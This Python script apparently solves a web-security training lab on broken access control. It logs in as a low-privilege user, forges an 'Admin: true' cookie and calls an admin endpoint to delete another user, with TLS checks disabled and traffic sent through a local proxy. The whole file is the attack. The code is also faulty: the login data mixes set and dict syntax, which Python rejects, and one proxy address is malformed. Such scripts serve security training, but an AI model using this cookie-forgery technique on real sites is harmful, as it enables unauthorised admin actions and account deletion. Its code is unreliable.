import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'https://127.0.0:8080'} #used to debug proxies

def get_csrf_token(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input",{'name':'csrf'})['value']
    return csrf

def delete_user(s,url):
    #get csrf token from login page
    login_url = url + '/login'
    csrf_token = get_csrf_token(s,login_url)
    
    #login as the wiener user
    data = {"csrf", csrf_token,"username": "wiener","password" : "peter"}
    
    r = s.post(login_url,data=data,verify=False,proxies=proxies)
    res = r.text
    if "log out" in res:
        print("(+)successful logged in as wiener user")
        #retrieve the session cookie
        session_cookie = r.cookies.get_dict().get("session")
        #visit the admin pannel and delete the user carlos
        delete_carlos_user_url = url  + "/admin/delete?username=carlos"
        cookies = {'session': session_cookie,"Admin": "true"}
        r = requests.get(delete_carlos_user_url,cookies=cookies,verify=False,proxies=proxies)
        if r.status_code == 200:
            print('(+)successfully deleted carlos user!\n')
        else:
            print('(+)failed to delete carlos user!\n')
            sys.exit(-1)
    else:
        print("(+)failed to log in as wiener user")
        sys.exit(-1)
def main():
    if len(sys.argv)!=2:#if user given  wrong credentials
        print("(+)usage: %s <url>"%sys.argv[0])
        print("(+)Example: %s www.example.com"%sys.argv[0])
        sys.exit(-1)
    s=requests.Session()
    url = sys.argv[1]
    delete_user(s,url)
if __name__ == '__main__':
    main()